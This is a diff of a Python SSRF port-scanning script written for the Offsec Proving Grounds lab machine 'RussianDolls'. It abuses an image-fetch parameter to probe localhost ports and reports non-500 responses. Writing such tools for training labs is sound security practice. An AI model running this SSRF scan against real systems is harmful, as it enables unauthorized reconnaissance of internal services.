@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 # URL fuzzer written for Offsec Proving Grounds machine "RussianDolls"
-# NOTE: The server first appears to be vulnerable to RFI but I couldn't seem to
+# # NOTE: The server first appears to be vulnerable to RFI but I couldn't seem to
 # take advantage of that. Because of the way the url is accessing local resources
 # I decided to scan for ports only open on the local machine to see if we could
 # take advantage that way. Doing all 65535 port is pretty slow but you can just 
@@ -13,38 +13,59 @@
 
 import requests
 import argparse
-import time
+from collections import Counter
 
-# Example URL for Offsec Proving Grounds machine "RussianDolls:
-# http://192.168.165.113:8080/image?image=http://localhost
+# Example usage:
+# python3 ssrf-fuzzer.py --url http://192.168.165.113:8080/image?image=http://localhost
 
-# Setup arguments and parser
-parser = argparse.ArgumentParser(description="A script that fuzzes a URL for response code 200 for SSRF.")
-parser.add_argument("--url", required=True, help="Target url")
+# Set up arguments
+parser = argparse.ArgumentParser(description="Fuzzes a base SSRF URL for non-500 responses.")
+parser.add_argument("--url", required=True, help="Base SSRF URL (e.g., http://target/image?image=http://localhost)")
+parser.add_argument("--range", type=int, default=10000, help="Port range to scan (default: 0–9999)")
+parser.add_argument("--timeout", type=float, default=3.0, help="Request timeout in seconds (default: 3)")
 args = parser.parse_args()
 
 
-### PRINT BANNER ###        
-print("SCRiPT By:                ")
+### BANNER ###
+print("SCRiPT By:                 ")
 print("        ,------.           ")            
 print(",--,--, |  .--. ',--,--,--.") 
 print("|      ;|  '--' ||        |") 
 print("|  ||  ||  | --' |  |  |  |") 
 print("`--''--'`--'     `--`--`--'")                            
-print("URL Fuzzer for SSRF")
-print("Written for Offsec PG machine - RussianDolls") 
-time.sleep(2)
+print("URL Fuzzer for SSRF - PG Machine: RussianDolls") 
+print(f"Target URL base: {args.url}")
+print("Starting scan...\n")
 
 
-### BEGIN SCAN ###
-base_url = args.url
-open = 0
+### SCAN ###
+open_count = 0
+status_counts = Counter()
 
-for port in range (8100): # you can change 8100 to 65535 to scan all ports, or set a custom range.
-    target_url = base_url + ":" + str(port)
-    response = requests.get(target_url, timeout=3)
-    if response.status_code != 500:
-        open =+ open + 1
-        print(f"[\033[92m\N{CHECK MARK}\033[00m] Port: {port} >>> Status code = [\033[92m{response.status_code}\033[00m]")
-    	
-print(f"Scan done, it appears there are {open} port(s) open!")
+for port in range(args.range):
+    target_url = f"{args.url}:{port}"
+    try:
+        response = requests.get(target_url, timeout=args.timeout)
+        code = response.status_code
+        status_counts[code] += 1
+
+        # Show anything not 500
+        if code != 500:
+            open_count += 1
+            print(f"[\033[92m✓\033[00m] Port {port} --> Status: \033[92m{code}\033[00m")
+    except requests.exceptions.Timeout:
+        print(f"[!] Port {port} --> Timeout")
+        status_counts["timeout"] += 1
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Port {port} --> Error: {e.__class__.__name__}")
+        status_counts["error"] += 1
+
+
+### PRINT SUMMARY ###
+print("\nScan complete!")
+print(f"Ports tested: {args.range}")
+print(f"Non-500 responses (likely interesting): \033[92m{open_count}\033[00m\n")
+
+print("Response code summary:")
+for code, count in status_counts.items():
+    print(f"  {code}: {count} responses")
